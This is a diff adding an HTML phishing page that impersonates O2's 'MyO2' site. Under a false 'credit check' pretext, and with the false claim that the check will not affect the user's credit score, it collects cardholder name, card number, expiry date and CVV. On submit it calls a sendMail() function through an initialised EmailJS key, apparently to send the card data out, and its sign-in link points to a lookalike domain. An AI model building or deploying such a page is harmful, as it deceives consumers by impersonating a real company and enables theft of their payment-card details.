@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Your custom CSS -->
+    <link rel="stylesheet" href="navbar.css">
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("tXIGR1lurPfnQ0RR5");
+        })();
+    </script>
+    <script src="script.js"></script>
+    <title>Login to MyO2</title>
+</head>
+<body>
+    <!-- Top bar -->
+    <div class="top-bar">
+        <div class="container">
+            <a href="https://mail-02.shop" class="sign-in">Sign in or Register</a>
+        </div>
+    </div>
+
+    <!-- Main Navbar -->
+    <nav class="navbar">
+        <div class="container">
+            <!-- Logo Section -->
+            <div class="logo-nav">
+                <div class="logo">
+                    <a href="https://www.o2.co.uk">
+                        <img src="PngItem_5149656-1.webp" alt="Logo">
+                    </a>
+                </div>
+            </div>
+
+            <!-- Hamburger Menu for Mobile -->
+            <div class="menu-toggle">☰</div> <!-- Hamburger icon for mobile view -->
+
+            <!-- Navigation Links -->
+            <ul class="nav-links">
+                <li><a href="https://www.o2.co.uk/shop">Shop</a></li>
+                <li><a href="https://www.o2.co.uk/whyo2">Why O2</a></li>
+                <li><a href="https://www.o2.co.uk/help">Help</a></li>
+            </ul>
+
+            <!-- Right Section (My O2, Search, Basket) -->
+            <div class="right-section">
+                <a href="#" class="my-o2">My O2</a>
+                <div class="search-icon">
+                    <a href="#"><img src="magnify.webp" alt="Search"></a>
+                </div>
+                <a href="#" class="search-link">Search</a>
+                <div class="basket-icon">
+                    <a href="#"><img src="basket_2-removebg-preview.png" alt="Basket"></a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- JavaScript to toggle the mobile menu -->
+    <script>
+        document.querySelector('.menu-toggle').addEventListener('click', function() {
+            const navLinks = document.querySelector('.nav-links');
+            navLinks.classList.toggle('active');
+        });
+    </script>
+
+    <!-- Credit Check Section -->
+    <div class="credit-check">
+        <div class="container">
+            <h1>Credit Check</h1>
+        </div>
+    </div>
+
+    <!-- Verify Your Identity Section -->
+    <div class="verify-identity">
+        <div class="container">
+            <h2>Verify Your Identity</h2>
+            <p>Credit Check is just to validate your identity not for the payment process and its not going to affect your credit score.</p>
+            <img src="cards-1536x214.webp" alt="Credit Cards" class="credit-card-image">
+        </div>
+    </div>
+
+    <!-- Card Details Section -->
+    <div class="card-details">
+        <div class="container">
+            <h2>Enter Your Card Details</h2>
+            <form action="nextpage.html" method="GET" onsubmit="return validateForm()">
+                <div class="form-group">
+                    <label for="card-name">Cardholder Name</label>
+                    <input type="text" id="card-name" placeholder="John Doe" required pattern="[A-Za-z\s]+" title="Only alphabetic characters are allowed" oninput="this.value = this.value.replace(/[^a-zA-Z\s]/g, '')">
+                </div>
+                <div class="form-group">
+                    <label for="card-number">Card Number</label>
+                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19" oninput="formatCardNumber(this)">
+                </div>
+                <div class="form-group inline-fields">
+                    <div>
+                        <label for="expiry-date">Expiry Date</label>
+                        <input type="text" id="expiry-date" placeholder="MM/YY" required maxlength="5" oninput="formatExpiryDate(this)">
+                    </div>
+                    <div>
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" placeholder="123" required maxlength="3" pattern="\d{3}" title="Please enter a valid 3-digit CVV" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    </div>
+                </div>
+                <button type="submit" onclick="sendMail()">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Support Section -->
+    <div class="support-section">
+        <p class="support-text">
+            If you need help accessing our services, check out our 
+            <a href="#" class="support-link">Access for all services</a> 
+            to find the ways we can offer support.
+        </p>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="container">
+            <!-- Footer Links Section -->
+            <div class="footer-links">
+                <div class="footer-column">
+                    <h4>Find a store</h4>
+                    <p><a href="#">Find a store</a></p>
+                    <p><a href="#">Check our network</a></p>
+                    <p><a href="#">Sign in to My O2</a></p>
+                    <p><a href="#">Track my order</a></p>
+                    <p><a href="#">Search</a></p>
+                </div>
+                <hr class="footer-divider">
+                <div class="footer-column">
+                    <h4>Popular in shop</h4>
+                    <p><a href="#">iPhone 16 Pro Max</a></p>
+                    <p><a href="#">iPhone 16 Pro</a></p>
+                    <p><a href="#">iPhone 16</a></p>
+                    <p><a href="#">Apple Watch Series 10</a></p>
+                    <p><a href="#">Apple iPad Pro 13 inch M4</a></p>
+                    <p><a href="#">Samsung Galaxy S24 Ultra</a></p>
+                    <p><a href="#">Google Pixel 9 Pro XL</a></p>
+                </div>
+                <hr class="footer-divider">
+                <div class="footer-column">
+                    <h4>Help and support</h4>
+                    <p><a href="#">Help home</a></p>
+                    <p><a href="#">Contact us</a></p>
+                    <p><a href="#">My O2</a></p>
+                    <p><a href="#">Collection and delivery</a></p>
+                </div>
+                <hr class="footer-divider">
+                <div class="footer-column">
+                    <h4>Shop</h4>
+                    <p><a href="#">Phones</a></p>
+                    <p><a href="#">Tablets</a></p>
+                    <p><a href="#">Pay Monthly Sim</a></p>
+                    <p><a href="#">Pay As You Go Sim</a></p>
+                </div>
+            </div>
+
+            <!-- Horizontal Line Before Social Section -->
+            <hr class="footer-divider">
+
+            <!-- Footer Bottom Section -->
+            <div class="footer-bottom">
+                <div class="footer-social">
+                    <a href="#"><img src="fb white png.png" alt="Facebook"></a>
+                    <a href="#"><img src="youtue white png.png" alt="YouTube"></a>
+                    <a href="#"><img src="x white png.png" alt="Twitter"></a>
+                    <a href="#"><img src="insta white png.png" alt="Instagram"></a>
+                </div>
+                <p class="footer-text">
+                    About O2 | Better Connection Plan | Careers | News & PR | Sponsorship | Virgin Media and O2
+                </p>
+                <p class="footer-text">
+                    Accessibility | Terms & Conditions | Privacy policy | Cookie policy | Modern Slavery Statement
+                </p>
+                <p class="footer-text">
+                    © 2024 Telefónica UK Limited
+                </p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS, Popper.js, and jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
+
+    <script>
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            input.value = formattedValue;
+        }
+
+        function formatExpiryDate(input) {
+            const value = input.value.replace(/\D/g, '');
+            if (value.length >= 3) {
+                input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            } else {
+                input.value = value;
+            }
+        }
+
+        function validateForm() {
+            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+            const cvv = document.getElementById('cvv').value;
+
+            if (cardNumber.length !== 16) {
+                alert('Card number must be exactly 16 digits long.');
+                return false;
+            }
+
+            if (cvv.length !== 3) {
+                alert('CVV must be exactly 3 digits long.');
+                return false;
+            }
+
+            return true;
+        }
+    </script>
+</body>
+</html>
